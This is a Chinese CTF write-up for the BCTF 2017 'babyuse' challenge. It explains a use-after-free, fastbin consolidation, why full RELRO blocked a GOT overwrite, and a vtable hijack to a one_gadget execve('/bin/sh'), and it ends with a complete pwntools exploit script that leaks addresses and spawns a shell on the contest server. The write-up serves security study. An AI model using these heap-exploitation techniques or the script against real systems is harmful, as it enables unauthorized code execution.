# bctf2017 babyuse

这道题其实一点也不难，就是一个 uaf，然后改虚表指针，跳转到任意地址，执行 shell，问题在于一开始认为改虚表指针指向 system 之后，第一个参数是 object 的地址，而首地址这时候是合理的虚表指针。但是大乌龟说可以用 [onegadget](https://github.com/david942j/one_gadget) 找到 libc 中的跳转地址，直接跳到哪里就能执行execve("/bin/sh", …, …) 了。

```C
int Use_a_Gun()
{
  unsigned int i; // eax@1
  int c; // eax@4
  Gun_all *pGun; // [esp+4h] [ebp-34h]@3
  char buf[32]; // [esp+Ch] [ebp-2Ch]@2
  int canary; // [esp+2Ch] [ebp-Ch]@1

  canary = *MK_FP(__GS__, 20);
  i = 0;
  do
  {
    *&buf[i] = 0;
    i += 4;
  }
  while ( i < 32 );
  pGun = guns_ptr[cur_selected_gun];
```

漏洞很好找，就是 uaf，在 Use_a_gun 函数里面没有判断 guns_in_use_array 对应的值是否为1，也就是没有判断当前 Gun 有没有被 free 掉。一开始没有想到 fastbin 可以 consolidate，一直觉得 free 掉 chunk 之后，虚表指针（fd）只能指向 null 或者另一个 chunk。第二天才想到可以在 fast chunk 旁边安排两个 free chunk，然后 malloc 一个很大的 chunk（应该是属于 large bin 或者比 large bin 还要大？），触发 fastbin 的合并。然后把合并后的 chunk malloc 给 Gun 的 name，然后就可以通过写入 name，来改写整个 Gun struct 了。

### 错误的思路

一开始想的是把虚表指针指向set_gun_name 这个函数

```C
int __cdecl set_gun_name(Gun_all *p)
{
  char *buf; // [esp+8h] [ebp-10h]@1
  int size; // [esp+Ch] [ebp-Ch]@1

  puts("Lenth of name：");
  size = get_Num() + 1;                         // 这里没有对 size 大小做出判断
  buf = malloc(size);
  if ( !buf )
    exit(-1);
  puts("Input name:");
  get_input(0, buf, size, '\n');
  if ( p->name )
    free(p->name);	//这里可以把任意地址 free 掉
  p->name = buf;
  return puts("succeed.");
}
```

通过里面的一个 free 函数，把任意地址 free，在 name 的空间里面构造一个 fake fastbin chunk，然后把它 free 掉，然后通过 rename 两次重新申请到同一片 name 空间，然后把 free fast chunk 的 fd 指针覆盖掉，覆盖成 指向 got 表的指针。然后 malloc 两次 fast chunk，就能获得一个指向 got 表的 fast chunk。这里用的是 fastbin malloc 的攻击方法。但是要注意的是，在 malloc 一个 fast chunk 的时候，libc 会 check 这个 malloc 出去的 fast chunk 的 size 字段是否合法。

```C
if (victim != 0){
	if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) {
		errstr = "malloc(): memory corruption (fast)";
		errout:
			malloc_printerr (check_action, errstr, chunk2mem (victim), av);
		return NULL;
	}
```

但是好在不检查是否地址对齐。所以可以在 got 表中找一个非对齐的地址，也可以尝试覆盖\__malloc_hook,  \__realloc_hook , \__free_hook等， 但是，这是32位的，32位一般就无法去覆盖 hook 函数指针，因为那里没有可以利用的 size，一般最高位都是f7开头的。

```assembly
gdb-peda$ x/20wx 0xf761e768-0x40
0xf761e728 <_IO_stdin_+40>:	0x00000000	0x00000000	0x00000000	0x00000000
0xf761e738 <_IO_stdin_+56>:	0x00000000	0x00000000	0xffffffff	0x00000000
0xf761e748 <_IO_stdin_+72>:	0xf761f8a0	0xf761db80	0x00000000	0x00000000
0xf761e758:	0x00000000	0x00000000	0xf74de1d0	0xf74de170
0xf761e768 <__malloc_hook>:	0x00000000	0x00000000	0x00000000	0x00000000
```

 如图找不到可以用的 size。

但在 got 表中找到可用的 size，

```assembly
gdb-peda$ telescope 0x5657efa4
0000| 0x5657efa4 --> 0x3e9c //0x3e 这个 size 可以利用
0004| 0x5657efa8 --> 0x0 
0008| 0x5657efac --> 0x0 
0012| 0x5657efb0 --> 0xf7693610 (<__cxa_pure_virtual>:	push   ebx)
0016| 0x5657efb4 --> 0xf74d1ff0 (<setbuf>:	sub    esp,0x10)
0020| 0x5657efb8 --> 0x0 
0024| 0x5657efbc --> 0x0 
0028| 0x5657efc0 --> 0xf7690d70 (<_ZdlPv>:	push   ebx)

```

```assembly
gdb-peda$ x/10wx 0x5657efa1
0x5657efa1:	0x9c000000	0x0000003e	0x00000000	0x10000000
0x5657efb1:	0xf0f76936	0x00f74d1f	0x00000000	0x70000000
0x5657efc1:	0x40f7690d	0x80f74845

```

如果让 fast chunk 中的 fd 覆盖成0x5657efa1就能成功绕过 size 的检查了。但是虽然成功 malloc 了一个 chunk 到 got，调试的时候发现 got 表完全没有被改写！程序在接收 input 的时候也出现了奇怪错位，单步调试跟到 read 函数，发现 read 函数的返回值是-1，打印 errno 是0xe，意思是EFAULT, 地址没有访问权限。xinfo 查看写入的 got 表的地址，是只读权限。其实这个问题之前是有遇到过的，但是一直没有太在意，因为 got 表肯定是可写的，显示只读只是因为 peda 可能出错了。但是 peda 没有出错，got 表确实是只读的。checksec 发现，程序开启了[RELRO](https://hardenedlinux.github.io/2016/11/25/RelRO.html), 而且是 FULL

```assembly
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled	//这个是啥意思还没搞清楚
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL		//这个 FULL 和 PARTIAL 的区别是什么？
```

所以 got 表的重定位工作是一上来就全部做好的，然后把这块区域变成只读的。所以改写 got 表的思路从一开始就是不可行的。

### 正确的思路

所以还是只能改虚表指针，虚表指针可以跳转到任意位置，但不一定要跳转到函数的开头，跳转到中间的话我们就不需要在意什么第一个参数是 object 自身这样的事了。

```C
  if (pid == (pid_t) 0)
121	    {
122	      /* Child side.  */
123	      const char *new_argv[4];
124	      new_argv[0] = SHELL_NAME;
125	      new_argv[1] = "-c";
126	      new_argv[2] = line;
127	      new_argv[3] = NULL;
128	
129	      /* Restore the signals.  */
130	      (void) __sigaction (SIGINT, &intr, (struct sigaction *) NULL);
131	      (void) __sigaction (SIGQUIT, &quit, (struct sigaction *) NULL);
132	      (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);
133	      INIT_LOCK ();
134	
135	      /* Exec the shell.  */
136	      (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
```

在 libc 的 do_system 函数中有执行execve("/bin/sh")，所以只要跳转到这个函数中的某一个位置，而这个位置能使 execve 的参数是合法的就行了。

onegadget 这个工具可以快速的找到一个给定 libc 中的合适的跳转地址，来执行 execve。

```shell
➜  babyuse one_gadget libc.so.remote
0x3ac69	execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the address of `rw-p` area of libc
  [esp+0x34] == NULL

0x5fbc5	execl("/bin/sh", eax)
constraints:
  esi is the address of `rw-p` area of libc
  eax == NULL

0x5fbc6	execl("/bin/sh", [esp])
constraints:
  esi is the address of `rw-p` area of libc
  [esp] == NULL
```

发现有三个地址可以，但都要满足一定的限制条件，one_gadget 提供了可以一次性自动测试所有的 gadget 地址的命令

```
➜  babyuse one_gadget libc.so.remote -s exp_babyuse.py 
```

原理是把地址作为脚本的第一个参数传进去，测试发现第一个 gadget 就符合要求。而远程的 libc 和本地的 libc 竟然一模一样，也是醉了，对面服务器也是 ubuntu 么。至此就成功利用了。

下面是利用脚本

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" dddong / AAA """

from pwn import *
import sys, os, re
context(arch='i386', os='linux', log_level='info')
context(terminal=['gnome-terminal', '-x', 'bash', '-c'])

def __get_base(p, _path):
    _vmmap = open('/proc/%d/maps' % p.proc.pid).read()
    _regex = '^.* r-xp .* {}$'.format(_path)
    _line = [_ for _ in _vmmap.split('\n') if re.match(_regex, _)][0]
    return int(_line.split('-')[0], 16)

def gen_rop(func_addr, args):
    """
    automate generate rop function
    _gadgets array contains gadgets address for 0,1,2,... args 
    """
    _gadgets = []
    rop = ""
    rop += p32(func_addr)
    if len(args) > 1:
        rop += _gadgets[len(args)]
        for arg in args:
            rop += p32(args)
    return rop


_program = 'babyuse' 
_pwn_remote = 0
_debug = int(sys.argv[1]) if len(sys.argv) > 1 else 0

elf = ELF('./' + _program)

if _pwn_remote == 0:
    os.environ['LD_PRELOAD'] = ''
    libc = ELF('./libc.so.6')
    p = process('./' + _program)

    if _debug != 0:
        if elf.pie:
            _bps = [0x144e] #breakpoints defined by yourself, not absolute addr, but offset addr of the program's base addr 
            _wps = [0x408c]
            _offset = __get_base(p, os.path.abspath(p.executable))
            _source = '\n'.join(['b*%d' % (_offset + _) for _ in _bps])
            _source = _source + '\n' + '\n'.join(['watch *%d' % (_offset + _) for _ in _wps])
        else:
            _source = 'source peda-session-%s.txt' % _program
else:
    libc = ELF('./libc.so.remote') 
    p = remote('202.112.51.247', 3456)	
    p.recvuntil("Token")
    p.sendline("zdWFHVaGx7NQQUeXTIXxckMTSxSxqq5y")

def buy_gun(choice, name_len, name):
    p.sendlineafter("7. Exit", "1")
    p.sendlineafter("2. QBZ95", str(choice))
    p.sendlineafter("of name", str(name_len))
    p.send(name)

def select_gun(idx):
    p.sendlineafter("7. Exit", "2")
    p.sendlineafter("Select a gun", str(idx))
    if not p.recvuntil("Select No.", timeout=0.2):
        log.error("select gun error!")
def list_guns():
    p.sendlineafter("7. Exit", "3")

def rename_gun(idx, name_len, name):
    p.sendlineafter("7. Exit", "4")
    p.sendlineafter("a gun to rename:", str(idx))
    p.sendlineafter("Lenth of name", str(name_len))
    p.sendafter("Input name:", name)

def use_gun(idx, uses):
    p.sendlineafter("7. Exit", "5")
    p.recvuntil("Select gun ")
    leak = p.recvn(4) #info leak
    p.recvuntil("4. Main menu")
    for u in uses:
        p.sendline(str(u))
    p.sendline("4")
    return leak

def drop_gun(idx):
    p.sendlineafter("7. Exit", "6")
    p.sendlineafter("to delete:\n", str(idx))
    ln = p.recvline()
    if "Deleted" not in ln:
        print ln
        log.error("drop gun error!")

def exitp():
    p.sendlineafter("7. Exit", "7")
    

def set_gun_name(name_len, name):
    p.sendlineafter("Lenth of name", str(name_len))
    p.sendafter("Input name", name)

###########################leak libc ################
buy_gun(1, 300, 'A' * 5 + '\n')
buy_gun(2, 16, 'B' * 5 + '\n')
select_gun(0)

drop_gun(1)
drop_gun(0)

leak_libc = u32(use_gun(0, [-1])[:4])
libc.address = leak_libc - 0x7b0 - 1777664
print "libc base address:", hex(libc.address)

#fast consolate
buy_gun(1, 100000, 'a' * 100 + '\n')
drop_gun(0)

####################### leak heap ####################
buy_gun(1, 24, 'a' * 5 + '\n')
buy_gun(1, 24, 'b' * 5 + '\n')
drop_gun(1)
select_gun(0)
drop_gun(0)
leak_heap = u32(use_gun(0, [-1])[:4])
heap_base = leak_heap - 19032
print "heap base addr:", hex(heap_base) #heap base + 0x4a08 is the first chunk


#fast consolate
buy_gun(1, 100000, 'a' * 100 + '\n')
drop_gun(0)

################### leak binary #############################
buy_gun(1, 19, 'a' * 19)
rename_gun(0, 600, 'b' * 10 + '\n')
buy_gun(1, 30, 'a' * 30)
buy_gun(1, 30, 'b' * 30)
select_gun(1)
drop_gun(1)
drop_gun(0)
rename_gun(2, 100000, '\n')

fake_gun_st = [
        heap_base + 0x4a38,                    #vtable 
        heap_base + 0x4cc8, #name
        15,                 #nmax_bullets
        15,                 #ncur_bullets
        ]
gun_st = "".join([ p32(_) for _ in fake_gun_st ])


rename_gun(2, 680, 'A' * 24 + gun_st + '\n')

vtable_addr = u32(use_gun(1, [-1])[:4])
print "vtable_addr:", hex(vtable_addr)
elf.address = vtable_addr - 0x1d30
print "elf addr:", hex(elf.address)

################## malloc big chunk #############################
# sz = ((heap_base + 0x1000000) & (0xff000000)) + 0x6873 - heap_base
# print "name chunk size:", sz
# buy_gun(1, sz, '\n')

################## vtable to execve ##################################

#set vtable
set_gun_name_addr = 0x149c
execve_gadget = libc.offset_to_vaddr(0x3ac69)
print "onegadget: ", hex(execve_gadget)
fake_vtable = [ elf.offset_to_vaddr(set_gun_name_addr), execve_gadget, 0 ]
vtable = "".join([ p32(_) for _ in fake_vtable ])

# #set free chunk
# free_chunk= [
#         0x0,
#         56 | 0x1,
#         elf.address + 0x3fa1,
#         0x0,
#         ]
# for i in range((56-8-8)/4):
#     free_chunk += [0x0] #padding the chunk(56 size)

# free_chunk += [0x0, 0x11]

# print "free chunk\n", free_chunk
# fake_free_ck = "".join([ p32(_) for _ in free_chunk ])

fake_gun_st = [
        heap_base + 0x4a38,                    #vtable 
        heap_base + 0x4a50, #name points a fake chunk
        15,                 #nmax_bullets
        15,                 #ncur_bullets
        ]
gun_st = "".join([ p32(_) for _ in fake_gun_st ])
rename_gun(2, 680, 'A' * 24 + gun_st + vtable + '\n')
rename_gun(2, 680, 'A' * 24 + gun_st + vtable + '\n')

if _debug != 0:
    gdb.attach(p.proc.pid, execute=_source)
use_gun(1, [2])
"""
#add the chunk in free chunk
p.sendlineafter("7. Exit", "5")
p.recvuntil("4. Main menu")
p.sendline("1") #1st item of vtable points to set_gun_name func
set_gun_name(19, 'a' + '\n')
p.sendline("4") #return to main menu

rename_gun(2, 40, '\n')

fb_free_ck = [
        0x0,
        56 | 0x1,
        elf.address + 0x3fa1, #addr in got,has valid size
        0x0,
        ]
fake_free_fb_ck = ''.join([ p32(_) for _ in fb_free_ck ])

buy_gun(1, 0x60, gun_st + vtable + cyclic(4) + fake_free_fb_ck + '\n')
# buy_gun(1, 47, '\n')
rename_gun(0, 47, '\n')
if _debug != 0:
    gdb.attach(p.proc.pid, execute=_source)
rename_gun(0, 47, '\x00\x00\x00' + p32(0) * 5 + p32(libc.symbols['system']) + '\n')
"""
p.interactive()

```



### 代办事项

1. 了解一下 one_gadget 的原理
2. 了解一下 checksec 里面所有的选项的意思
3. 关于 glibc 的 malloc 里面所有的 security check 写一个cheatsheet